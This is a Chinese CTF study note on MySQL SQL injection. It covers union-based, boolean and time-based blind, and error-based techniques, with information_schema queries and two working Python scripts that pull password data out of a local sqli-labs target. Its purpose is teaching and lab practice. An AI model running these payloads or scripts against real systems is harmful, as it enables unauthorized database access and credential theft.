---
title:   关于SQL注入小记
categories: [CTF]
tags: [sql,web]

---
sql注入产生的原因是未对用户输入进行处理，导致输入的恶意信息与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。

<!-- more -->

## sql注入思路

1.寻找注入点

2.确定注入类型

​     1)若页面有明显变化:联合查询注入。

​	 2)若页面有报错回显:报错注入。

​	 3)只用正确与错误的回显或无回显:盲注(布尔盲注,时间盲注)。

3.利用自带函数查询数据库信息.database()查询当前数据库名、user()查数据库用户、version()查数据库版本等。

4.查库名->查表名->查字段名->查数据 ,以达到目的.



## 联合查询注入步骤

### 1)用二分法确定字段数量

使用`order/group by`语句。通过往后边拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于或等于，则页面正常从而找到字段的数量。

### 2)判断页面回显数据的字段位置

使用union select 1,2,3,4,x... 我们定义的数字将显示在页面上，即可从中页面显示的数字所在的位置推断出可以利用的字符串的位置。

### 3)利用sql内置函数进行信息收集

database()查询当前数据库名、user()查询数据库账号、version()查询数据库版本等基本情况，再根据不同的版本、不同的权限确定接下来的方法。



### 4.1)若Mysql版本>=5.0

MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库 information_schema ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 

具体而言:

SCHEMATA

储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等

TABLES

储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等

COLUMNS

储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等



#### (1)查询数据库中的所有库名

```sql
SELECT  schema_name FROM information_schema.schemata
```

#### (2)获取数据库中的表

```mysql
select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```

#### (3)获取数据库中的表

```mysql
select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(table_name)#此表名可以为字符串型，也可以十六进制表示
```

#### (4)获取信息

```mysql
select null,group_concat(*) from table_name
(or)
select null,group_concat('column_name') from ('table_name')

```

### 4.2)Mysql版本<5.0

mysql的低版本缺乏系统库information_schema，我们无法直接查询表名，字段(列)名等信息，这时候只能靠猜或是通过盲注.

## 盲注的方法

在提交时，正确页面与错误页面相比有变化，则使用布尔的盲注。正确页面与错误页面无变化，使用时间注入。

但无论是布尔还时间都会用到，下面盲注常用的函数：
        (1)length(str) ：返回字符串str的长度

(2)substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

(3)mid(str,pos,len) ：跟上面的一样，截取字符串

(4)ascii(str) ：返回字符串str的最左面字符的ASCII代码值

(5)ord(str) ：将字符或布尔类型转成ascll码

(6)if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

#### 布尔注入

通过构造substr或mid函数来，截取返回值的结果中某一个字符。再利正确页面与错误页面不同的特性，来枚举出来。

布尔注入脚本：

```python
import requests

def lenth(sql,jiao):#爆破长度
    for i in range(100):
    
        if(len(requests.get('http://192.168.14.137/Less-2/?id=1 and length(('+sql+'))>'+str(i)).text))==jiao:
             return (i)
            
def substrchr(sql,jiao,strlen):#爆破内容
    w=''
    for k in range(1,strlen+1):
        for i in range(33,127):
            if(len(requests.get('http://192.168.14.137/Less-2/?id=1 and ascii(substr(('+sql+'),'+str(k)+',1))>'+str(i)).text))==jiao:                
                w=w+chr(i)
                print(chr(i),end='')
                break
    return (w)


#zheng=len(requests.get('http://192.168.14.137/Less-2/?id=1').text)#721

jiao=len(requests.get('http://192.168.14.137/Less-2/?id=1 and length(database())>1111').text)#670
#sql='select database()' //爆当前库名
#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名
#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名
#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名
sql='select group_concat(password) from users' #爆内容

w=lenth(sql,jiao)

w=substrchr(sql,jiao,w)

```



#### 时间盲注

通过判断页面返回内容的响应时间差异进行条件判断。通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。

简单的时间盲注入脚本:

```python
import requests
import time

def lenth(sql):
    for i in range(100):
         start=time.time()
         requests.get('http://192.168.14.137/Less-2/?id=1 and if(length(('+sql+'))>'+str(i)+',1,sleep(3) )')
    
         if((time.time()-start)>3):
             print('长度是'+str(i))
             return (i)
            
def substrchr(sql,strlen):
    w=''
    for k in range(1,strlen+1):
        for i in range(33,127):
             start=time.time()
             requests.get('http://192.168.14.137/Less-2/?id=1 and if(ascii(substr(('+sql+'),'+str(k)+',1))>'+str(i)+',1,sleep(2))')
             
             if((time.time()-start)>2):              
                w=w+chr(i)
                print(chr(i),end='')
                break
    return (w)





#sql='select database()' #爆当前库名
#sql='select group_concat(schema_name) from information_schema.schemata' #爆所有库名
#sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'#爆库中所有表名
#sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"'#爆表中所有字段名
#sql='select group_concat(password) from users' #爆内容

long=lenth(sql)

text=substrchr(sql,long)

```

## 报错注入

通过特殊函数的错误使用使其参数被页面输出。

前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。

常见的利用函数有：exp()、floor()+rand()、updatexml()、extractvalue()等

[关于updatexml()报错注入](https://lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/)

updatexml()等函数报错通常有报错输出长度的限制，可以进行用substr等函数分割输出。

有的报错函数要求输出一行数据或只一次查询一个字段,可以使用group_concat等函数聚合数据即可。





## 参考文献

[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169#toc-53)

[SQL 注入绕过](https://xz.aliyun.com/t/2869)

